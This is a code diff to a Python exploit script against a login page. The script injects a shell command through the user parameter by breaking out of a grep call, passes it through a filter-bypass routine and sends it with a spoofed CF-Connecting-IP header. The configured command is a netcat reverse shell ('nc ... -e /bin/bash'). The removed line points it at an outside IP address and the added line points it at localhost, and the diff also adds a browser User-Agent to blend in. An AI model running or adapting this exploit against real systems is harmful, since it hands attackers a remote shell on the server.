@@ -8,7 +8,7 @@ import re
 
 # configuration
 TARGET = 'http://example.com/login.php'
-COMMAND = 'nc 51.89.205.217 4444 -e /bin/bash'
+COMMAND = 'nc 127.0.0.1 4444 -e /bin/bash'
 QUERY = 'user=%s&pw=password'
 
 
@@ -23,6 +23,10 @@ class Exploit:
         self.target = target
         self.query = query
         self.command = command
+        self.headers = {
+            'HTTP_CF_CONNECTING_IP': '127.0.0.1',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36 Edg/84.0.522.59'
+        }
 
 
     def validate(self, command: str) -> bool:
@@ -85,13 +89,13 @@ class Exploit:
         if self.validate(self.command) is False:
             raise ExploitException('Command not possible to execute')
 
-        # i.e grep -i '' /dev/null; echo "Hello World!" # /var/www/html/users.sql
+        # i.e grep -i '' /dev/null; echo "Hello World!" #/var/www/html/users.sql
         payload = self.bypass_filter(f"'' /dev/null; {self.command} #")
 
         if encode:
             payload = urllib.parse.quote(payload)
 
-        return requests.get(f'{self.target}?{self.query}' % payload, headers={'HTTP_CF_CONNECTING_IP': '127.0.0.1'})
+        return requests.get(f'{self.target}?{self.query}' % payload, headers=self.headers)
 
 
 def main():
